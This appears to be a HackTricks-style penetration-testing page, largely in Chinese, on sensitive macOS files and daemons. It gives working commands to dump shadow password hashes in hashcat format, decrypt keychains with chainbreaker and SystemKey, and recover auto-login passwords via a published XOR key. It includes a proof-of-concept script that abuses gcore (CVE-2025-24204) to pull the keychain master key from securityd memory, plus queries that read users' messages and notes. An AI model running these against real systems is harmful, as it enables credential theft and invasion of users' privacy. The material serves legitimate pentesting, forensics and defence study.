# macOS 敏感位置 & 有趣的守护进程

{{#include ../../../banners/hacktricks-training.md}}

## 密码

### Shadow 密码

Shadow 密码与用户的配置一起存储在位于 **`/var/db/dslocal/nodes/Default/users/`** 的 plist 中。\
下面的单行命令可用于转储**关于所有用户的所有信息**（包括哈希信息）：
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**像这样的脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 或 [**这个**](https://github.com/octomagon/davegrohl.git) 可用于将散列转换为 **hashcat** **格式**。

另一个一行命令可以以 **hashcat** 格式 `-m 7100`（macOS PBKDF2-SHA512）转储所有非服务账户的凭据：
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
另一种获取用户 `ShadowHashData` 的方法是使用 `dscl`： `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

该文件仅在系统处于 **单用户模式** 时使用（因此不常用）。

### Keychain Dump

请注意，在使用 security 二进制文件来 **转储已解密的密码** 时，会弹出多个提示，要求用户允许此操作。
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> 根据这个评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)，看起来这些工具在 Big Sur 上已不能工作。

### Keychaindump 概述

已开发出一个名为 **keychaindump** 的工具用于从 macOS 钥匙串中提取密码，但正如该 [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) 所示，它在较新的 macOS 版本（如 Big Sur）上存在局限。使用 **keychaindump** 需要攻击者取得访问权限并升级权限到 **root**。该工具利用了钥匙串在用户登录时默认为方便而解锁的事实，使应用程序可以访问它而无需反复输入用户密码。然而，如果用户选择在每次使用后锁定他们的钥匙串，**keychaindump** 将无法奏效。

**Keychaindump** 的工作方式是针对一个名为 **securityd** 的特定进程，该进程被 Apple 描述为负责授权和加密操作的守护进程，对于访问钥匙串至关重要。提取过程涉及识别从用户登录密码派生的 **Master Key**。该密钥对于读取钥匙串文件是必需的。为定位 **Master Key**，**keychaindump** 使用 `vmmap` 命令扫描 **securityd** 的内存堆，查找标记为 `MALLOC_TINY` 的区域中可能的密钥。用于检查这些内存位置的命令如下：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
在识别出潜在的主密钥后，**keychaindump** 会在堆中搜索一个特定模式（`0x0000000000000018`），该模式表明主密钥的候选项。如 **keychaindump** 的源代码所示，使用该密钥需要进一步的步骤，包括 deobfuscation。关注该领域的分析人员应注意，用于解密 keychain 的关键数据存储在 **securityd** 进程的内存中。运行 **keychaindump** 的示例命令为：
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可用于以取证上可靠的方式从 OSX 钥匙串中提取以下类型的信息：

- 已哈希的钥匙串密码，可使用 [hashcat](https://hashcat.net/hashcat/) 或 [John the Ripper](https://www.openwall.com/john/) 进行破解
- 互联网密码
- 通用密码
- 私钥
- 公钥
- X509 证书
- 安全便笺
- Appleshare 密码

如果提供钥匙串解锁密码、使用 [volafox](https://github.com/n0fate/volafox) 或 [volatility](https://github.com/volatilityfoundation/volatility) 获取的主密钥，或诸如 SystemKey 的解锁文件，Chainbreaker 还会提供明文密码。

如果没有上述任何一种解锁钥匙串的方法，Chainbreaker 将显示所有其他可用信息。

#### **导出钥匙串密钥**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **使用 SystemKey 转储钥匙串密钥（含密码）**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **导出 keychain keys（含密码）——破解哈希**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用 memory dump 转储 keychain 密钥（含密码）**

[按照这些步骤](../index.html#dumping-memory-with-osxpmem) 来执行 **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **使用用户密码 Dump keychain keys（含密码）**

如果你知道用户的密码，可以用它来 **dump 并解密属于该用户的 keychains**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### 通过 `gcore` 权限 获取钥匙串主密钥 (CVE-2025-24204)

macOS 15.0 (Sequoia) 随附 `/usr/bin/gcore`，并带有 **`com.apple.system-task-ports.read`** 权限，因此任何本地管理员（或恶意签名的应用）都可以转储 **any process memory even with SIP/TCC enforced**。转储 `securityd` 会 leaks the **钥匙串主密钥** 以明文形式，并允许你在没有用户密码的情况下解密 `login.keychain-db`。

**在易受影响的版本 (15.0–15.2) 上的快速复现：**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).

The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesting Information in Databases

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

您可以在 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` 找到通知数据。

大部分有趣的信息位于 **blob** 中。因此您需要**提取**该内容并**转换**为**人类可读**，或使用 **`strings`**。要访问它，您可以执行：
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### 最近的隐私问题 (NotificationCenter DB)

- 在 macOS **14.7–15.1** 中，Apple 将横幅内容存储在 `db2/db` SQLite 中，且未进行适当的掩码处理。CVE 列表 **CVE-2024-44292/44293/40838/54504** 允许任何本地用户仅通过打开该 DB 即可读取其他用户的通知文本（不会触发 TCC 提示）。在 **15.2** 中通过移动/锁定该 DB 修复；在较旧的系统上，上述路径仍然 leaks 最近的通知和附件。
- 该数据库仅在受影响的构建上对所有用户可读，因此在对旧端点进行取证/排查时，请在更新前复制该数据库以保留证据。

### Notes

用户的 **notes** 可以在 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` 中找到。
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## 首选项

在 macOS 应用中，首选项位于 **`$HOME/Library/Preferences`**，而在 iOS 中位于 `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`。

在 macOS 中，CLI 工具 **`defaults`** 可用于 **修改首选项文件**。

**`/usr/sbin/cfprefsd`** 接管 XPC 服务 `com.apple.cfprefsd.daemon` 和 `com.apple.cfprefsd.agent`，并且可以被调用以执行例如修改首选项的操作。

## OpenDirectory permissions.plist

文件 `/System/Library/OpenDirectory/permissions.plist` 包含应用于节点属性的权限，并受 SIP 保护。\
该文件通过 UUID（而非 uid）将权限授予特定用户，从而使他们能够访问特定的敏感信息，例如 `ShadowHashData`、`HeimdalSRPKey` 和 `KerberosKeys` 等：
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## 系统通知

### Darwin 通知

通知的主要守护进程是 **`/usr/sbin/notifyd`**。为了接收通知，客户端必须通过 `com.apple.system.notification_center` Mach 端口注册（可用 `sudo lsmp -p <pid notifyd>` 检查）。该守护进程可以通过文件 `/etc/notify.conf` 配置。

用于通知的名称是唯一的反向 DNS 表示法，当向这些名称之一发送通知时，已声明可以处理该通知的客户端将接收它。

可以通过向 notifyd 进程发送信号 SIGUSR2，并读取生成的文件 `/var/run/notifyd_<pid>.status` 来转储当前状态（并查看所有名称）：
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### 分布式通知中心

**分布式通知中心** 的主二进制是 **`/usr/sbin/distnoted`**，是另一种发送通知的方式。它暴露了一些 XPC 服务，并会执行一些检查来尝试验证客户端。

### Apple Push Notifications (APN)

在这种情况下，应用可以为 **主题 (topics)** 注册。客户端会通过 **`apsd`** 联系 Apple 的服务器来生成一个 token。\
随后，提供者也会生成一个 token，并能够连接到 Apple 的服务器向客户端发送消息。这些消息会被本地的 **`apsd`** 接收，**`apsd`** 会将通知转发给正在等待的应用。

偏好设置位于 /Library/Preferences/com.apple.apsd.plist。

在 macOS 上有一个本地消息数据库，位于 /Library/Application\ Support/ApplePushService/aps.db，在 iOS 上位于 /var/mobile/Library/ApplePushService。它包含 3 个表：`incoming_messages`、`outgoing_messages` 和 `channel`。
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
也可以通过以下方式获取有关 daemon 和连接的信息：
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## 用户通知

这些是用户应该在屏幕上看到的通知：

- **`CFUserNotification`**: 这些 API 提供了一种在屏幕上显示带消息弹出窗口的方式。
- **The Bulletin Board**: 这会在 iOS 中显示一个会消失的横幅，并会被存储在 Notification Center 中。
- **`NSUserNotificationCenter`**: 这是 MacOS 中的 iOS 公告板。存放通知的数据库位于 `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## References

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
